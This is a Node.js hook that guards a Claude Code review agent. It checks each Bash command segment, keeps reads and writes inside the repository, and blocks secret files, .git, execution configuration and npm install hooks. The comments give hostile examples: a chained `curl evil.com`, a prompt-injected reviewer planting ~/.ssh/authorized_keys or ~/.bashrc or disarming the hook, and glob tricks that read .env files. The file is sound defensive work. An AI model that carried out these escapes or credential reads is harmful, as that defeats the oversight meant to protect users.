#!/usr/bin/env node
/**
 * Claude Code PreToolUse hook — the enforcement point for two things the
 * permission engine cannot express.
 *
 * 1. Bash commands, segment by segment. Claude Code matches a Bash rule
 *    against the whole command as a prefix, so `Bash(git status:*)` also
 *    permits `git status; curl evil.com`, and deny globs never fire. A hook is
 *    the only place that sees the real command before it runs, and it also
 *    covers the reviewer's subagents. This version of the CLI strips an "allow"
 *    from a PreToolUse hook, so the hook can only subtract; it therefore checks
 *    every segment against the same policy reviewAllowedTools() renders.
 *
 * 2. Write-tool scope. In fix mode Edit/Write/NotebookEdit are allowed, but the
 *    permission system has no notion of "inside this directory" for them: a
 *    prompt-injected reviewer can write to any absolute path — `~/.ssh/
 *    authorized_keys`, `~/.bashrc`, or this very hook file, which would disarm
 *    the guard for every later run. Deny globs only match paths that already
 *    exist and whose name matches, so a new file at a new path is written
 *    freely. The repo root is passed in via CLAUDE_REVIEW_REPO_ROOT.
 *
 * Contract: read the hook payload from stdin, write nothing to allow, write a
 * PreToolUse deny decision to block. Unexpected internal errors deny as well —
 * a broken guard must fail closed, or the allowlist silently stops meaning
 * anything.
 */
import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";
import fs from "node:fs";

const guardUrl = pathToFileURL(
  path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "src", "shell-guard.js"),
).href;

const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const READ_TOOLS = new Set(["Read"]);
// Granted as bare rules by reviewAllowedTools(); they carry a path field and
// used to produce no decision at all (audit P1-5).
const GREP_GLOB_TOOLS = new Set(["Grep", "Glob"]);

/**
 * The policy tables and the fingerprint live in src/shell-guard.js so the hook
 * and the server hash the same policy (audit P1-13). Load it once: every tool
 * branch needs the tables, and a guard that cannot load must fail closed.
 */
let guardPolicy = null;
let guardPolicyError = null;
try {
  guardPolicy = await import(guardUrl);
} catch (err) {
  guardPolicyError = err;
}
const PROTECTED_WRITE = guardPolicy?.PROTECTED_WRITE;
const isSecretPath = guardPolicy?.isSecretPath;
// P2-3: the containment primitive is shared with the server/guard module — this
// hook used to carry a fifth copy, and the copies had already diverged.
const repoRelative = guardPolicy?.repoRelative;

/**
 * Info mode (CC_REVIEW_GUARD_INFO=1): print the policy fingerprint and exit.
 *
 * The server compares it with its own in-memory policy before every run, so an
 * upgrade that did not restart the MCP host is detected and refused instead of
 * silently running two different policies. Normal hook invocations never set this
 * variable, so the decision channel (stdout) keeps its single-JSON-line contract.
 */
if (process.env.CC_REVIEW_GUARD_INFO === "1") {
  try {
    if (!guardPolicy) throw guardPolicyError || new Error("shell-guard.js did not load");
    fs.writeSync(1, JSON.stringify({ fingerprint: guardPolicy.policyFingerprint() }) + "\n");
  } catch (e) {
    fs.writeSync(1, JSON.stringify({ fingerprint: null, error: String(e?.message || e) }) + "\n");
  }
  process.exit(0);
}

/**
 * package.json is not wholesale protected: fix mode legitimately edits its
 * metadata (dependencies, scripts.test). What must never be planted is an
 * install hook, which runs the next time anyone runs npm install. Only the
 * Write tool carries the full new body, so only Write is checked here; an Edit
 * or MultiEdit can still introduce the same key one line at a time (documented
 * residual — the permission engine denies the file name, not the content).
 */
const PACKAGE_INSTALL_SCRIPT = /["'](?:pre|post)?install["']\s*:/;

function packageJsonAddsInstallScript(content) {
  if (typeof content !== "string") return false;
  try {
    const pkg = JSON.parse(content);
    const scripts = pkg && typeof pkg === "object" ? pkg.scripts : null;
    if (!scripts || typeof scripts !== "object" || Array.isArray(scripts)) return false;
    return ["preinstall", "install", "postinstall"].some((k) =>
      Object.prototype.hasOwnProperty.call(scripts, k));
  } catch {
    // An unparseable body is not a package.json anyone can install; fall back
    // to the literal key so a truncated write cannot slip the hook through.
    return PACKAGE_INSTALL_SCRIPT.test(content);
  }
}

/** Why relSlash is secret material, or null. label is the tool + decision verb. */
function secretPathProblem(relSlash, label, action) {
  if (!isSecretPath(relSlash)) return null;
  if (action === "write") {
    return label + " blocked: `" + relSlash + "` is secret material (.env, credential, key or vault file). " +
      "fix mode may edit source; it must not create or modify credentials, keys or vaults. " +
      "Point the fix at a non-secret file; `.env.example` / `.env.sample` templates are allowed.";
  }
  return label + " blocked: `" + relSlash + "` is secret material (.env, credential, key or vault file). " +
    "A review must not copy credentials into the transcript, run log or report. " +
    "Read a non-secret file instead; `.env.example` / `.env.sample` templates are allowed.";
}

/** Why relSlash is secret material review mode must not Read, or null. */
function secretReadProblem(relSlash, tool = "Read") {
  return secretPathProblem(relSlash, tool, "read");
}

/**
 * The same boundary for the Bash surface (audit P1-4): rg/grep/git view can read
 * .env, keys and credential stores without going through the Read tool, and the
 * text lands in the transcript/run log/report just the same. Scan every
 * whitespace/operator-delimited token, including the value after =, the path
 * after a git rev: prefix, and a Windows backslash path.
 */
function secretBashProblem(command) {
  // A dot-glob can expand to the repository's dotfiles before the program
  // runs: `git show HEAD:a | cat .*` and `rg -n x .*` read .env / .npmrc /
  // .ssh without ever spelling them. git also expands its own pathspec globs
  // even when the shell quoted them (`git diff -- 'src/.*'`). The guard's
  // tokenizer answers both, while a quoted regex (rg '.*', find -name '.*')
  // stays usable.
  const dotGlob = guardPolicy.dotGlobProblem(String(command));
  if (dotGlob) return dotGlob;

  const tokens = String(command).split(/[\s;|&()<>'"`,]+/);
  for (const raw of tokens) {
    if (!raw || raw === "-") continue;
    const candidates = [raw];
    const eq = raw.indexOf("=");
    if (eq > 0) candidates.push(raw.slice(eq + 1));
    const colon = raw.lastIndexOf(":");
    if (colon > 0 && !/^[A-Za-z]:[\\/]/.test(raw)) candidates.push(raw.slice(colon + 1));
    // A Windows path is the one case where backslashes are separators rather
    // than regex escapes; do not normalize a pattern such as \.env, which is a
    // legal way to search for the literal dot. Only a host that actually treats
    // these as paths gets the normalized candidate.
    if (process.platform === "win32" && /^(?:[A-Za-z]:\\|\\\\)|^\.{1,2}\\/.test(raw)) {
      candidates.push(raw.replace(/\\/g, "/"));
    }
    for (const candidate of candidates) {
      const clean = candidate.replace(/^\.\//, "");
      if (!clean) continue;
      if (isSecretPath(clean)) return clean;
      // A glob can name the secret without spelling it: .env* / credentials* /
      // [.]env all expand to the same file before the command runs. Judge the
      // glob-stripped spelling too, so the check cannot be stepped around with
      // one wildcard (audit P1-4).
      const globless = clean.replace(/[*?\[\]]/g, "");
      // A bare "secrets" directory/file is not on the list (the rule is
      // secrets.<ext>), but secrets* is a glob that can match secrets.yaml.
      if (globless && globless !== clean &&
        (isSecretPath(globless) || /(^|\/)secrets$/.test(globless))) return clean;
    }
  }
  return null;
}

let raw = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (d) => { raw += d; });

/**
 * Emit a PreToolUse deny and exit. `code` is 0 for a normal policy denial.
 * The stdin-error path passes 1: if the CLI ignores our stdout on a failed
 * hook, its `onFailure: "block"` (the launcher sets it) must still stop the
 * call. Exiting 0 with no output means "no opinion" — the old handler did
 * exactly that on a broken stdin and silently unguarded the tool call (P0-4).
 */
const emitDeny = (reason, code = 0) => {
  // fs.writeSync, not process.stdout.write: a synchronous write to fd 1 cannot
  // race process.exit(), which on a full pipe has dropped the decision JSON.
  const line = JSON.stringify({
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: reason,
    },
  }) + "\n";
  try { fs.writeSync(1, line); } catch { /* parent gone */ }
  try { fs.writeSync(2, `[cc-code-review pre-tool hook] ${reason}\n`); } catch { /* ignore */ }
  process.exit(code);
};

process.stdin.on("error", () => {
  emitDeny(
    "blocked: the PreToolUse hook could not read its stdin, so it cannot see which tool is being called. Refusing to run it (fail closed).",
    1,
  );
});

process.stdin.on("end", async () => {
  const deny = (reason) => emitDeny(reason, 0);

  // The policy module now carries the write/read/Bash tables, so a hook that
  // cannot load it has no policy at all: fail closed for every payload shape,
  // including one we would otherwise treat as "not ours" and pass through.
  if (guardPolicyError || !PROTECTED_WRITE || typeof isSecretPath !== "function" ||
    typeof guardPolicy?.dotGlobProblem !== "function" || typeof repoRelative !== "function") {
    emitDeny(
      "the shell policy failed to load (" + (guardPolicyError?.message || "missing exports") + "); refusing the tool call (fail closed)",
      1,
    );
  }

  // Containment comes from shell-guard's repoRelative() (audit P2-3): one
  // realpath implementation for the hook, the guard and the metadata reader.

  let payload;
  try {
    payload = JSON.parse(raw || "{}");
  } catch {
    process.exit(0); // not our payload shape; let the normal permission path decide
  }

  const tool = payload?.tool_name;

  // ---- write tools: scope to the reviewed repository ----
  if (WRITE_TOOLS.has(tool)) {
    const root = process.env.CLAUDE_REVIEW_REPO_ROOT;
    if (!root) deny(`${tool} blocked: no repository root was provided to the guard`);
    // NotebookEdit names its target `notebook_path`; without it the target was
    // the empty string, containment said "outside", and every notebook edit in
    // fix mode was refused (audit SEC-25).
    const target = String(
      payload?.tool_input?.file_path ?? payload?.tool_input?.notebook_path ?? payload?.tool_input?.path ?? "",
    );
    let rel;
    try {
      rel = repoRelative(root, target);
    } catch {
      deny(`${tool} blocked: cannot resolve the target path against the repository root`);
    }
    if (rel === null) {
      deny(`${tool} blocked: cannot resolve the target path against the repository root`);
    }
    if (!rel || rel.startsWith("..") || path.isAbsolute(rel)) {
      deny(`${tool} blocked: fix mode may only write inside the reviewed repository (${root}), not ${target}`);
    }
    // Compare on a forward-slash form and case-insensitively: macOS and Windows
    // resolve .GIT/.Git to the same directory as .git, and realpath keeps the
    // case the caller wrote, so an exact lowercase match was bypassable.
    const relSlash = rel.split(path.sep).join("/");
    if (/(^|\/)\.git(\/|$)/i.test(relSlash)) {
      deny(`${tool} blocked: refusing to touch .git/ — a hook written there would outlive this run`);
    }
    const execCfg = PROTECTED_WRITE.find((re) => re.test(relSlash));
    if (execCfg) {
      deny(`${tool} blocked: ${relSlash} is execution configuration — it runs code (or decides what runs) when the project is opened, its diff is taken, or CI starts. fix mode may edit source files, not plant persistence. Edit the source file the finding points at instead.`);
    }
    // A credential file planted in the repo is read by the next reviewer and
    // GitHub-facing tooling; fix mode must not create or modify one (audit
    // P2-2: the write side was missing the secret patterns entirely).
    const secret = secretPathProblem(relSlash, tool, "write");
    if (secret) deny(secret);
    // package.json is only special-cased for the keys that make npm RUN
    // something on the next install. Metadata edits stay allowed (audit P1-3).
    if (/(^|\/)package\.json$/i.test(relSlash)) {
      // The Write tool carries the whole new body; Edit/MultiEdit carry only the
      // replacement text. Both are checked now (P1-4 residual): an Edit that adds
      // scripts.postinstall plants the same install-time command one line at a
      // time.
      const edits = Array.isArray(payload?.tool_input?.edits) ? payload.tool_input.edits : [];
      const added = tool === "Write"
        ? payload?.tool_input?.content
        : [payload?.tool_input?.new_string, ...edits.map((e) => e?.new_string)].filter((s) => typeof s === "string").join("\n");
      if (packageJsonAddsInstallScript(added)) {
        deny(`${tool} blocked: ${relSlash} would gain an install hook (scripts.preinstall/install/postinstall), which runs the next time anyone runs npm install. fix mode may change package metadata, not plant an install-time command. Write the package.json without that script; install hooks are not permitted in fix mode.`);
      }
    }
    process.exit(0);
  }

  // ---- read tools: keep the reviewer from walking off into the user's home ----
  if (READ_TOOLS.has(tool)) {
    const root = process.env.CLAUDE_REVIEW_REPO_ROOT;
    const target = String(payload?.tool_input?.file_path ?? payload?.tool_input?.path ?? "");
    if (!root) deny("Read blocked: no repository root was provided to the guard (fail closed)");
    // Same fail-closed shape as the write branch above: a containment error means
    // the boundary cannot be established (the root was deleted, renamed, or is
    // unreadable), and the old `catch { rel = null }` let that through as ALLOW.
    // Read is granted as a bare rule with no path constraint, so this hook is the
    // only boundary — it must deny instead of passing the call (audit P0-3).
    let rel;
    try {
      rel = repoRelative(root, target);
    } catch {
      deny("Read blocked: cannot resolve the target path against the repository root (fail closed)");
    }
    if (rel === null) {
      deny("Read blocked: cannot resolve the target path against the repository root (fail closed)");
    }
    if (!rel || rel.startsWith("..") || path.isAbsolute(rel)) {
      deny(`Read blocked: the review may only read inside the reviewed repository (${root}), not ${target}`);
    }
    // A secret inside the repo is still a secret: refuse it before the path is
    // handed to the model (audit SEC-23).
    const relSlash = rel.split(path.sep).join("/");
    const secret = secretReadProblem(relSlash);
    if (secret) deny(secret);
    process.exit(0);
  }

  // ---- Grep/Glob: the same boundary as Read, keyed on the path field ----
  // reviewAllowedTools() grants both as bare rules, so this is their only
  // boundary. Grep's pattern is a regex, not a path; Glob's pattern is a glob
  // rooted at its path argument, so only that path is resolved (audit P1-5).
  if (GREP_GLOB_TOOLS.has(tool)) {
    const root = process.env.CLAUDE_REVIEW_REPO_ROOT;
    if (!root) deny(`${tool} blocked: no repository root was provided to the guard (fail closed)`);
    const target = String(payload?.tool_input?.path ?? "");
    // An omitted path means the process cwd, which the launcher sets to the
    // repository root. That is inside the boundary, so only check it when the
    // caller names one.
    if (!target) process.exit(0);
    let rel;
    try {
      rel = repoRelative(root, target);
    } catch {
      deny(`${tool} blocked: cannot resolve the target path against the repository root (fail closed)`);
    }
    if (rel === null) {
      deny(`${tool} blocked: cannot resolve the target path against the repository root (fail closed)`);
    }
    // The root itself is a legitimate search root for both tools (rel is ""),
    // unlike Read, which has no use for "the directory as a file" (audit P2-3).
    if (rel.startsWith("..") || path.isAbsolute(rel)) {
      deny(`${tool} blocked: the review may only search inside the reviewed repository (${root}), not ${target}`);
    }
    if (rel) {
      const relSlash = rel.split(path.sep).join("/");
      const secret = secretReadProblem(relSlash, tool);
      if (secret) deny(secret);
    }
    process.exit(0);
  }

  if (tool !== "Bash") process.exit(0);

  // Fail closed when the command is not a string: analyseCommand treats a
  // non-string as inert ({ ok: true }), so a payload that carries the command
  // under another key or wrong type would run unguarded (audit SEC-24). An
  // empty string is a no-op and stays allowed — the guard already handles it.
  const command = payload?.tool_input?.command;
  if (typeof command !== "string") {
    deny(`Bash blocked: the hook payload carries no command string (got ${command === null ? "null" : typeof command}), so the shell guard cannot inspect it (fail closed).`);
    return;
  }

  const guard = guardPolicy?.guardVerdict;
  if (typeof guard !== "function") {
    deny("shell guard failed to load (guardVerdict is missing); refusing to run Bash");
    return;
  }

  // The Bash policy is scoped to the repository (cd targets, find/rg/sink path
  // arguments). Without the root there is nothing to scope to, so fail closed —
  // the same rule the write/read tools already follow.
  const repoRoot = process.env.CLAUDE_REVIEW_REPO_ROOT;
  if (!repoRoot) {
    deny("Bash blocked: no repository root was provided to the guard, so file reads cannot be scoped (fail closed)");
    return;
  }

  try {
    const verdict = guard(command, { repoRoot });
    if (!verdict.ok) deny(verdict.reason);
  } catch (err) {
    deny(`shell guard failed (${err?.message || err}); refusing to run Bash`);
    return;
  }

  // The guard scopes paths but deliberately allows the repository's own files;
  // a secret INSIDE the repo is still a secret once rg/grep/git print it into
  // the transcript (audit P1-4). Only run this after the guard allowed the
  // command, so a policy denial keeps its more specific reason.
  let secret = null;
  try {
    secret = secretBashProblem(command);
  } catch (err) {
    deny(`Bash blocked: the secret-material check failed (${err?.message || err}); refusing to run Bash (fail closed)`);
  }
  if (secret) {
    deny(`Bash blocked: the command names or globs secret material ("${secret}") — a .env, credential, key or vault file. A review must not copy credentials into the transcript, run log or report. Read a non-secret file instead; .env.example / .env.sample templates are allowed.`);
  }
  process.exit(0);
});
